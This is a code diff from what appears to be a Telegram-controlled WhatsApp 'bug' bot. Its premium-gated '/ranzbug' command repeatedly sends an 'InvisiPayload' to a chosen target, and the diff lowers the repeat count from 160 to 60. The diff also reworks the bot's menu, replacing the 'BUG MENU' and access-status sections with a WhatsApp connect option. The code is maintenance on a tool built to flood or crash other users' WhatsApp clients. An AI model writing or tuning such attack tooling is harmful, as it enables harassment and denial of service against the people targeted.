@@ -1683,7 +1683,7 @@ bot.command("ranzbug", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 160; i++) {
+        for (let i = 0; i < 60; i++) {
           await InvisiPayload(sock, target);
         }
         successCount++;
@@ -2157,12 +2157,8 @@ async function sendMainMenu(ctx) {
 │ ᴏs : ʟɪɴᴜx
 │ ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
 ╰─────
-╭───── ⧼ 𝑨 𝑪 𝑪 𝑬 𝑺 𝑺 ⧽
-│ ᴀᴅᴍɪɴ : ${isAdminStatus ? "✅" : "❌"}
-│ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
-╰─────
-╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ranzbug
+╭───── ⧼ CONNECT BOT WHATSAPP ⧽
+│ /connect
 ╰─────
     `,
     parse_mode: "Markdown",
@@ -2210,12 +2206,8 @@ bot.action("startmenu", async (ctx) => {
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
 ╰─────
-╭───── ⧼ 𝑨 𝑪 𝑪 𝑬 𝑺 𝑺 ⧽
-│ ᴀᴅᴍɪɴ : ${isAdminStatus ? "✅" : "❌"}
-│ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
-╰─────
-╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ranzbug
+╭───── ⧼ CONNECT BOT WHATSAPP ⧽
+│ /connect
 ╰─────
 `;
 
